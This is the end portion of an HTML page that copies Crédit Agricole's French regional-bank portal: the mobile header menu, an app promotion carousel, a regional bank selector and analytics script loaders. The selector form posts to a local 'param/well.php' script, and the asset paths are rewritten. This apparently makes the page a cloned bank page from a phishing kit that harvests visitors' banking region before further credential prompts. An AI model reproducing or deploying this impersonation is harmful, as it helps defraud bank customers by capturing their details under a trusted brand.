					<a class="Header-menuFooterBtn" onclick="NPC.storeLocator.gotoAccesCrEtAgence();event.preventDefault()" href="#" aria-label="Trouver une agence" role="button">
						 <div><i class="icon npc-locator-blank Header-menuFooterIcon"></i></div>
						 <div class="Header-menuFooterText">
						 	Trouver une agence
						 </div>
					</a>
				</div>
				
				<div class="col-xs-4 text-center bv-trigger-burger">
					<div class="icon npc-talk-blank Header-menuFooterIcon"></div>
					<div class="Header-menuFooterText "  tabindex="0" role="button">Nous contacter</div>
				</div>
	
				<div class="col-xs-4 text-center">
					










<a class="Header-menuFooterBtn" href="#" target="_self">
	 <div class="icon npc-add Header-menuFooterIcon"></div>
	<div class="Header-menuFooterText">Ouvrir un compte</div>
</a>
				</div>
			
			
			
			</div>
		</div>
	</div>
	
</div>

<script>
     (function(document, $){
    	 $(".Header-menuRow[href='#advices']").on("click",function(){
            var placeToAddNosConseilsMenu = $(".js-LayerNav-advices");
            if(placeToAddNosConseilsMenu[0].childElementCount<1){
                $.ajax({
                    url: "#"
                })
            	.success(function(data) {
					placeToAddNosConseilsMenu.append(data);
                    LayerNav.initialize();
        			LayerNav.toggle($(".Header-menuRow[href='#advices']"));
                })
                .error(function(data) {
                    placeToAddNosConseilsMenu.append("<div>Une erreur est survenue durant le chargement</div>");
                    console.log("erreur de chargement du menu nos conseils");
                    console.log(data);
                });
            }
        });
     })(document, Granite.$);
</script>

<script type="text/html" id="template-retour-menu-mobile">
    <div class="visible-xs visible-sm">
      <a href="#" class="LayerNav-backMobile js-backMenuMobile"><i class="icon npc-left LayerNav-backMobileIcon"></i> Retour</a>
    </div>
</script>

<script type="text/html" id="template-item-menu-mobile-connecte-non-cliquable">
	<a href="#" class="row Header-menuRow">
		<div class="col-xs-2 text-center Header-menuIcon"><div class="icon npc-card"></div></div>
		<div class="col-xs-8"><span class="Header-menuRowText" data-content="noeudMenuTitre"></span></div>
		<div class="col-xs-2 text-center"><div class="icon npc-arrow-next"></div></div>
	</a>
</script>

<script type="text/html" id="template-item-menu-mobile-connecte">
	<a data-href="noeudMenuHref" class="row Header-menuRow">
		<div class="col-xs-2 text-center Header-menuIcon"><div class="icon npc-card"></div></div>
		<div class="col-xs-8"><span class="Header-menuRowText" data-content="noeudMenuTitre"></span></div>
		<div class="col-xs-2 text-center"><div class="icon npc-arrow-next"></div></div>
	</a>
</script>


    		
		    		
		   		
		    
		    
		
	





<div id="inbenta" class="inbenta-interface hidden-print" data-cr="national" data-langue="fr" data-marche="particulier" data-univers-besoin="acces-cr">
</div>

<div id="inbenta-compagnon-container" class="hidden-print" data-cr="national" data-langue="fr" data-marche="particulier" data-univers-besoin="acces-cr">
    
</div>
<div id="tchat_session" class="hidden-print" data-value='{"genesysTchat": false}'>
    
</div>
		</header>
	
	<main tabindex="-1" id="main">
		








<div class="Template container-fluid">
    <div class="row js-Template-head">
      <div class="hidden-xs col-md-6">
        <div class="js-StickyPush row">
          <div class="js-FullHeight">
            <!-- BEGIN C053 -->
  			<div class="placeholder-1 parsys"><div class="row-control parbase section">










<div class="RowControl RowControl">
    
        
            
            <div class="row-control-parsys1 parsys-new-zdg parsys">

<div class="new-zdg parbase section">












    
    

<script>
    $(function () {


        window.ContextHub.eventing.on(ContextHub.SegmentEngine.PageInteraction.Teaser.prototype.info.loadEvent, function (event) {
            $(window).trigger('initCustomRedirect');
        });
        // Anomalie 351261 : il faut enlever la dernière <br> qui traine en fin de la zone de dialogue RTE
        // Pour garder que les 20px attendus entre la description et le bas de l'aplat
        $("div[class='PushCommunication-text']").find("p").each(function () {
            var inner = $(this)[0].innerHTML.trim();
            var brIfExist = inner.substr(inner.length - 4);
            var brAndNbspIfExist = inner.substr(inner.length - 11);
            if (brIfExist.indexOf("<br>") >= 0 || (brAndNbspIfExist.indexOf("<br>") >= 0 && brAndNbspIfExist.indexOf("&nbsp;") >= 0)) {
                setTimeout(removeLastBr, 1000, $(this));
            }
        });
        function removeLastBr(p) {
            $(p).find("br:last-child").remove();
        }
    });
</script>

    
        <div class="componentZdg">
            <div class="PushCarousel3">
                <div><button class="PushCarousel3-masking" onclick="toggleStateCarousel('hom')">Mettre en pause ou
                        redémarrer le défilement du carousel</button></div>
                <div class="PushCarousel3-carousel">
                    <div data-trackingclass="carrousel" class="PushCarousel3-carouselInner">
                        
                                

                            
                            <div class="PushCarousel3-item" data-trackinginfo="">

                                <div class="PushCommunication-backgroundWrapper">
                                    <div class="PushCommunication-background PushCommunication-background--filterTransparent"
                                        style="background-image: url('images/NPC_ZDG_Loop.jpg')">
                                    </div>
                                </div>
                                <div class="PushCommunication-zoning PushCommunication-zoning--bottomCenter PushCommunication-zoning--primary">
                                    
                                    
                                        <div class="PushCommunication-title">
                                            <div class="texte section"><p><span class="RichText-titreComposant"><span class="RichText-texteBlanc"><b>Téléchargez l’application Ma Banque</b></span></span></p></div>
                                        </div>
                                    
                                    <div class="PushCommunication-text">
                                        <div class="texte section">
                                            <p><span class="RichText-texteBlanc">Chacun d’entre vous gère différemment ses besoins bancaires.<br>
Seul ou accompagné, au Crédit Agricole, vous aurez toujours le choix entre vous adresser à un conseiller ou utiliser l’application Ma Banque.</span></p>
                                        </div>
                                    </div>
                                    
                                    	
                                    	
										<!-- Si la popin de co est activé -->
										
										<!-- Si la popin de co n'est pas activé -->
										
											
											<a href="#" class="PushCommunication-btn PushCommunication-btn--primary" data-custom-redirect="#" target="_self"><span>Découvrez les grandes fonctionnalités</span></a>
										
										
										
                                </div>
                            </div>
                        

                    </div>
                </div>
            </div>
        </div>
        <script>
            if (typeof sliderRelationalMessage === 'function') {
                sliderRelationalMessage();
            };
        </script>
    
    
    
    
    
	
</div>

</div>
	
        
        
    
</div>
</div>

</div>

            <!-- END C053 -->
          </div>
        </div>
      </div>
      <div class="col-xs-12 col-md-6">
          <div class="parsys">
            <div class="section">
              <div class="StoreLocatorPopIn-geolocationDisabled">

				<div class="placeholder-2 parsys"><div class="texte section">




<div tabindex="-1">
    
</div>
</div>

</div>

				
					<div class="placeholder-2-1 parsys"><div class="trouver-un-CR parbase section">








<script src="print/settings/wcm/designs/ca/npc/clientlib-google-map.min.87a76470d686bc99a65e1f582ee93f13.js"></script>
<script src="print/settings/wcm/designs/ca/npc/clientlibStoreLocatorGeneral.min.fed0763fde2431a7c1b27d703f22ca4e.js"></script>




<div class="GeolocComponent GeolocationDisabled section">

	
	<div class="GeolocationDisabled-content matchHeight">

		<div id="trouver-un-cr-mode-search" style="display: none">

	                <form action="param/well.php" method="post">
	
					<h2 class="GeolocationDisabled-title GeolocForceSearch">
				ACCÉDER À L'ESPACE DÉDIÉ <br /> <strong>D'UNE AUTRE CAISSE RÉGIONALE</strong>
			</h2>
			<p class="GeolocationDisabled-text GeolocationDisabled-text--margin GeolocForceSearch">
				Vous n'êtes pas en <strong class="GeolocCR">XXXX</strong> ou vous souhaitez accéder à l'espace dédié d'une autre Caisse Régionale en saisissant un département.</strong>
			</p>

			
			<h2 class="GeolocationDisabled-title GeolocFail">
				ACCÉDER À L'ESPACE DÉDIÉ <br /> <strong>DE VOTRE CAISSE RÉGIONALE</strong>
			</h2>
			<p id="labelCodeDepartementCR" class="GeolocationDisabled-text GeolocFail">Trouvez une caisse régionale en saisissant un département</p>						
	

			<div>
				<div class="form-group">
					<input id="GeolocSearchInput" type="text" class="form-control GeolocationDisabled-noBorder" placeholder="Exemple 75 pour Paris." aria-labelledby="labelCodeDepartementCR" aria-describedby="errorMessageCR" name="region_number">
					<span id="errorMessageCR" class="help-block"></span>
				</div>
			</div>

			<p class="GeolocationDisabled-text">Ou</p>

			<div class="row">
				<div class="form-group">
					<select id="trouver-un-cr-selector" class="selectpicker show-menu-arrow col-xs-12 bootstrap-select--default GeolocationDisabled-noBorder StoreLocator-whiteSelect"
						onchange="NPC.trouverCR.clearSearchDepartment()" title="Choisissez une caisse régionale ou une banque" name="reisse">
						
							
							
										<option value="no-value" selected disabled>Choisissez une caisse régionale</option>						
							
						
						
						
							
								<option value="/ca-alpesprovence/">Alpes Provence</option>
							
						
							
								<option value="/ca-alsace-vosges/">Alsace Vosges</option>
							
						
							
								<option value="/ca-anjou-maine/">Anjou Maine</option>
							
						
							
								<option value="/ca-aquitaine/">Aquitaine</option>
							
						
							
								<option value="/ca-atlantique-vendee/">Atlantique Vendée</option>
							
						
							
								<option value="/ca-briepicardie/">Brie Picardie</option>
							
						
							
								<option value="/ca-centrest/">Centre Est</option>
							
						
							
								<option value="/ca-centrefrance/">Centre France</option>
							
						
							
								<option value="/ca-centreloire/">Centre Loire</option>
							
						
							
								<option value="/ca-centreouest/">Centre Ouest</option>
							
						
							
						
							
								<option value="/ca-cb/">Champagne Bourgogne</option>
							
						
							
								<option value="/ca-cmds/">Charente Maritime Deux-Sèvres</option>
							
						
							
								<option value="/ca-charente-perigord/">Charente Périgord</option>
							
						
							
								<option value="/ca-corse/">Corse</option>
							
						
							
								<option value="/ca-cotesdarmor/">Côtes d'Armor</option>
							
						
							
								<option value="/ca-des-savoie/">Des Savoie</option>
							
						
							
								<option value="/ca-finistere/">Finistère</option>
							
						
							
								<option value="/ca-franchecomte/">Franche Comté</option>
							
						
							
								<option value="/ca-guadeloupe/">Guadeloupe</option>
							
						
							
								<option value="/ca-illeetvilaine/">Ille et Vilaine</option>
							
						
							
								<option value="/ca-languedoc/">Languedoc</option>
							
						
							
								<option value="/ca-loirehauteloire/">Loire Haute-Loire</option>
							
						
							
								<option value="/ca-lorraine/">Lorraine</option>
							
						
							
								<option value="/ca-martinique/">Martinique Guyane</option>
							
						
							
								<option value="/ca-morbihan/">Morbihan</option>
							
						
							
								<option value="/ca-norddefrance/">Nord De France</option>
							
						
							
								<option value="/ca-nord-est/">Nord Est</option>
							
						
							
								<option value="/ca-nmp/">Nord Midi Pyrénées</option>
							
						
							
								<option value="/ca-normandie/">Normandie</option>
							
						
							
								<option value="/ca-normandie-seine/">Normandie Seine</option>
							
						
							
								<option value="/ca-paris/">Paris et Île de France</option>
							
						
							
								<option value="/ca-pca/">Provence Côte d'Azur</option>
							
						
							
								<option value="/ca-pyrenees-gascogne/">Pyrénées Gascogne</option>
							
						
							
								<option value="/ca-reunion/">Réunion</option>
							
						
							
								<option value="/ca-sudmed/">Sud Méditerranée</option>
							
						
							
								<option value="/ca-sudrhonealpes/">Sud Rhône Alpes</option>
							
						
							
								<option value="/ca-toulouse31/">Toulouse 31</option>
							
						
							
								<option value="/ca-tourainepoitou/">Touraine Poitou</option>
							
						
							
								<option value="/ca-valdefrance/">Val De France</option>
							
						
					</select>
				</div>
			</div>

			<button type="submit" class="btn btn-primary GeolocationDisabled-btn" aria-label="Rechercher une caisse régionale" onclick="NPC.trouverCR.runSearch()">Rechercher une caisse régionale</button>
			
			<div id="divPlusieursCR" aria-live="polite">
				 
		      		<p class="GeolocationEnabled-text GeolocationEnabled-text--margin"><a href="caisses-regionales.html">Voir tous les sites des Caisses régionales.</a></p>
				
				
					
					
						<p id="pMultiplesReponses" class="GeolocationDisabled-text PlusieursCR"><span class="GeolocQtyCr">XX</span> caisses régionales correspondent à ce département. <span aria-hidden="true">Accéder à l'espace dédié :</span></p>
					
				
			</div>
      		<div class="GeolocationDisabled-btnWrap PlusieursCR btnsCr"></div>
		</div>

		


		
		<div id="trouver-un-cr-mode-found" style="display: none">
		
			
			
				<h2 id="GeolocOK" class="GeolocationEnabled-title" style="display: none">
					NOUS VOUS AVONS GÉOLOCALISÉ DANS LA CAISSE RÉGIONALE <br /> <strong class="GeolocCR">XXXX</strong>
				</h2>						
			
		
			
			<h2 id="GeolocEnCours" class="GeolocationEnabled-title">
				Localisation en cours
			</h2>

			<div class="GeolocationEnabled-contentIcon">
				<i class="icon npc-locator-blank GeolocationEnabled-icon" aria-hidden="true"></i>
			</div>

			<p class="GeolocationEnabled-text GeolocationEnabled-text--margin UnCR" aria-hidden="true" style="display: none">Accéder à l'espace dédié :</p>

			<div class="GeolocationEnabled-btnWrap btnsCr"></div>
			
				
				
							<div class="GeolocationEnabled-btnWrap  GeolocationEnabled-text--margin">
			        		<a role="button" id="btnAutreCaisse" href="#" onclick="NPC.trouverCR.selectOtherCr()" aria-label="Accéder à l'espace dédié d'une autre caisse régionale " class="btn">Autre caisse régionale</a>
			      		</div>							
				
			
      		 
	      		<p class="GeolocationEnabled-text GeolocationEnabled-text--margin"><a href="#">Voir tous les sites des Caisses régionales.</a></p>
			

		</div>
		
	</div>

</div>


<script>

	var NPC = NPC || {};
	NPC.trouverCR = NPC.trouverCR || {};
	NPC.listCr = {};
	
		NPC.listCr[813] = {regionalBankId: 813, regionalBankName: "Alpes Provence", regionalBankUrlPrefix: "/ca-alpesprovence/" };
	
		NPC.listCr[872] = {regionalBankId: 872, regionalBankName: "Alsace Vosges", regionalBankUrlPrefix: "/ca-alsace-vosges/" };
	
		NPC.listCr[879] = {regionalBankId: 879, regionalBankName: "Anjou Maine", regionalBankUrlPrefix: "/ca-anjou-maine/" };
	
		NPC.listCr[833] = {regionalBankId: 833, regionalBankName: "Aquitaine", regionalBankUrlPrefix: "/ca-aquitaine/" };
	
		NPC.listCr[847] = {regionalBankId: 847, regionalBankName: "Atlantique Vendée", regionalBankUrlPrefix: "/ca-atlantique-vendee/" };
	
		NPC.listCr[887] = {regionalBankId: 887, regionalBankName: "Brie Picardie", regionalBankUrlPrefix: "/ca-briepicardie/" };
	
		NPC.listCr[878] = {regionalBankId: 878, regionalBankName: "Centre Est", regionalBankUrlPrefix: "/ca-centrest/" };
	
		NPC.listCr[868] = {regionalBankId: 868, regionalBankName: "Centre France", regionalBankUrlPrefix: "/ca-centrefrance/" };
	
		NPC.listCr[848] = {regionalBankId: 848, regionalBankName: "Centre Loire", regionalBankUrlPrefix: "/ca-centreloire/" };
	
		NPC.listCr[895] = {regionalBankId: 895, regionalBankName: "Centre Ouest", regionalBankUrlPrefix: "/ca-centreouest/" };
	
		NPC.listCr[764] = {regionalBankId: 764, regionalBankName: "Chalus", regionalBankUrlPrefix: "/" };
	
		NPC.listCr[810] = {regionalBankId: 810, regionalBankName: "Champagne Bourgogne", regionalBankUrlPrefix: "/ca-cb/" };
	
		NPC.listCr[817] = {regionalBankId: 817, regionalBankName: "Charente Maritime Deux-Sèvres", regionalBankUrlPrefix: "/ca-cmds/" };
	
		NPC.listCr[824] = {regionalBankId: 824, regionalBankName: "Charente Périgord", regionalBankUrlPrefix: "/ca-charente-perigord/" };
	
		NPC.listCr[820] = {regionalBankId: 820, regionalBankName: "Corse", regionalBankUrlPrefix: "/ca-corse/" };
	
		NPC.listCr[822] = {regionalBankId: 822, regionalBankName: "Côtes d'Armor", regionalBankUrlPrefix: "/ca-cotesdarmor/" };
	
		NPC.listCr[881] = {regionalBankId: 881, regionalBankName: "Des Savoie", regionalBankUrlPrefix: "/ca-des-savoie/" };
	
		NPC.listCr[829] = {regionalBankId: 829, regionalBankName: "Finistère", regionalBankUrlPrefix: "/ca-finistere/" };
	
		NPC.listCr[825] = {regionalBankId: 825, regionalBankName: "Franche Comté", regionalBankUrlPrefix: "/ca-franchecomte/" };
	
		NPC.listCr[900] = {regionalBankId: 900, regionalBankName: "Guadeloupe", regionalBankUrlPrefix: "/ca-guadeloupe/" };
	
		NPC.listCr[836] = {regionalBankId: 836, regionalBankName: "Ille et Vilaine", regionalBankUrlPrefix: "/ca-illeetvilaine/" };
	
		NPC.listCr[835] = {regionalBankId: 835, regionalBankName: "Languedoc", regionalBankUrlPrefix: "/ca-languedoc/" };
	
		NPC.listCr[845] = {regionalBankId: 845, regionalBankName: "Loire Haute-Loire", regionalBankUrlPrefix: "/ca-loirehauteloire/" };
	
		NPC.listCr[861] = {regionalBankId: 861, regionalBankName: "Lorraine", regionalBankUrlPrefix: "/ca-lorraine/" };
	
		NPC.listCr[902] = {regionalBankId: 902, regionalBankName: "Martinique Guyane", regionalBankUrlPrefix: "/ca-martinique/" };
	
		NPC.listCr[860] = {regionalBankId: 860, regionalBankName: "Morbihan", regionalBankUrlPrefix: "/ca-morbihan/" };
	
		NPC.listCr[867] = {regionalBankId: 867, regionalBankName: "Nord De France", regionalBankUrlPrefix: "/ca-norddefrance/" };
	
		NPC.listCr[802] = {regionalBankId: 802, regionalBankName: "Nord Est", regionalBankUrlPrefix: "/ca-nord-est/" };
	
		NPC.listCr[812] = {regionalBankId: 812, regionalBankName: "Nord Midi Pyrénées", regionalBankUrlPrefix: "/ca-nmp/" };
	
		NPC.listCr[866] = {regionalBankId: 866, regionalBankName: "Normandie", regionalBankUrlPrefix: "/ca-normandie/" };
	
		NPC.listCr[883] = {regionalBankId: 883, regionalBankName: "Normandie Seine", regionalBankUrlPrefix: "/ca-normandie-seine/" };
	
		NPC.listCr[882] = {regionalBankId: 882, regionalBankName: "Paris et Île de France", regionalBankUrlPrefix: "/ca-paris/" };
	
		NPC.listCr[891] = {regionalBankId: 891, regionalBankName: "Provence Côte d'Azur", regionalBankUrlPrefix: "/ca-pca/" };
	
		NPC.listCr[869] = {regionalBankId: 869, regionalBankName: "Pyrénées Gascogne", regionalBankUrlPrefix: "/ca-pyrenees-gascogne/" };
	
		NPC.listCr[903] = {regionalBankId: 903, regionalBankName: "Réunion", regionalBankUrlPrefix: "/ca-reunion/" };
	
		NPC.listCr[871] = {regionalBankId: 871, regionalBankName: "Sud Méditerranée", regionalBankUrlPrefix: "/ca-sudmed/" };
	
		NPC.listCr[839] = {regionalBankId: 839, regionalBankName: "Sud Rhône Alpes", regionalBankUrlPrefix: "/ca-sudrhonealpes/" };
	
		NPC.listCr[831] = {regionalBankId: 831, regionalBankName: "Toulouse 31", regionalBankUrlPrefix: "/ca-toulouse31/" };
	
		NPC.listCr[894] = {regionalBankId: 894, regionalBankName: "Touraine Poitou", regionalBankUrlPrefix: "/ca-tourainepoitou/" };
	
		NPC.listCr[844] = {regionalBankId: 844, regionalBankName: "Val De France", regionalBankUrlPrefix: "/ca-valdefrance/" };
	

	NPC.storeLocator = NPC.storeLocator || {};

	NPC.trouverCRRun = function(){
		if (NPC.trouverCR.init){
			NPC.trouverCR.init(); 
		}
	};
</script>
<script>
    (function (document, $) {
	    var blocker  = document.querySelector( '#GeolocSearchInput' );
	    var observer = new MutationObserver( function( mutations ){
	        mutations.forEach( function( mutation ){
	            if (!mutation.target.classList.contains('GeolocationDisabled-noBorder')) {             
	                $('#GeolocSearchInput').focus();
	            }
	        });
	    });
	
	    observer.observe( blocker, { attributes: true } );
	    
	    $( "#btnAutreCaisse" ).on("click", function(e) { $("#GeolocSearchInput").focus(); });
	    $( "#btnAutreBanque" ).on("click", function(e) { $("#GeolocSearchInput").focus(); });
       
    })(document, Granite.$);
</script>
</div>

</div>

				
                <div class="placeholder-3 parsys"><div class="texte section">




<div tabindex="-1">
    
</div>
</div>

</div>

              </div>
            </div>
          </div>
      </div>
  </div>
</div>
	</main>

	
	<script>
        
        var NPC = NPC || {};
    </script>

	
		<footer>
			
		    <div class="Footer">
				
		    </div>
	    </footer>
	


	

	
	<script src="print/settings/wcm/designs/ca/npc/clientlib-npc-components.min.b6efd65ae8c18d73875a5e228a1dc167.js"></script>

	







	
	    
	        
	        
         		<script src="print/settings/wcm/designs/ca/npc/clientlibBoutonVertGeneralVitrine.min.6d249ff421b187a168e04f64e3949080.js"></script>

	        
	    
    
    




















	


<script>

    	// First header h1
    	var tc_vars = tc_vars || {};
        tc_vars.page_entete_H1 = '';
        for(var i=0;i<jQuery('h1').length;i++) {
			tc_vars.page_entete_H1 = jQuery('h1').get(i).textContent.trim();
            if(tc_vars.page_entete_H1 !== '') {break;}
        }
        
        if(ContextHub != null) {
    		var deviceStore = ContextHub.getStore("surferinfo");
    		deviceStore.eventing.on(ContextHub.Constants.EVENT_STORE_READY, function() {
    			var categoryDevice = deviceStore.getItem("/device").category;
    			if (categoryDevice === 'Desktop')
    				categoryDevice = 'Ordinateur';
    			else if (categoryDevice === 'Tablet')
    				categoryDevice = 'Tablette';
    			tc_vars.utilisateur_device = categoryDevice;
    	    });
    	}

        callCreerConteneurTagCmd();
        
        function callCreerConteneurTagCmd() {
        	
        	
            if(true && !false) {

                if(true && true) {
    				creerElementScript("../../cdn.tagcommander.com/3315/tc_PortailClientCreditAgricole_2.js", "async");
                } else if(true) {
    				creerElementScript("../../cdn.tagcommander.com/3315/uat/tc_PortailClientCreditAgricole_2.js", "async");
                }

                if(true && false) {
    				creerElementScript("../../cdn.tagcommander.com/3315/tc_CreditAgricoleCRSitemaitre_6.js", "async");
                } else if(false) {
    				creerElementScript("../../cdn.tagcommander.com/3315/uat/tc_CreditAgricoleCRSitemaitre_6.js", "async");
                }
                
                if(true && true) {
    				creerElementScript("../../cdn.tagcommander.com/3315/tc_PortailClientCreditAgricole_4.js", "async");
                } else if(true) {
    				creerElementScript("../../cdn.tagcommander.com/3315/uat/tc_PortailClientCreditAgricole_4.js", "async");
                }
            }
            
            
        }

        function creerElementScript(url, isAsync) {
            var eltScript = document.createElement('script');
            eltScript.type = "text/javascript";
    		eltScript.src = url;
            eltScript.async = (isAsync == "async") ? true : false;
            document.getElementsByTagName('body')[0].appendChild(eltScript);
        }

</script>
    
    

   

</body>

</html>